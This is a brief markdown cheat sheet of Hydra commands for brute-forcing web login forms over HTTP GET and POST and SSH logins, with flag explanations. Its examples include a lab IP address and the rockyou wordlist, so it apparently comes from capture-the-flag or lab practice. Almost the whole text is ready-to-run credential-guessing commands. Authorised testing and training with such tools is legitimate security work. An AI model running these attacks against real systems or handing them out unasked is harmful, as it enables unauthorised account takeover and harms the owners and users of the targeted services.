## Get Request Command
    hydra -L users.txt -p whatever -t 10 -o result-attack.txt
     url http-get-form "/ajax.php:fun=login&username=^USER^&password=^PASS^:invalid user"

**-L** : file for USER value

**-p** : test password

**-P**: file for PASS value

**-o** : output file

**-t** : number of tasks

*invalid user* : response result

    hydra -L myusers.txt -P password.txt -t 10 -o result-attack.txt
    url http-get-form "/ajax.php:fun=login&username=^USER^&password=^PASS^:invalid password"

&nbsp;

## Post Request Command

    hydra 3.challenge.auth.site http-post-form "/login.php:username=^USER^&password=^PASS^:invalid user"
    
<br/>

    hydra url http-post-form "/login.php:username=^USER^&password=^PASS^&Login=submit:invalid user"

**Login** : name attribute of the input or button

**submit**: value of button or type of input

    hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

**-l** : test username

<br/>

## SSH

    hydra url  -t 4 ssh -L users.txt -P pass.txt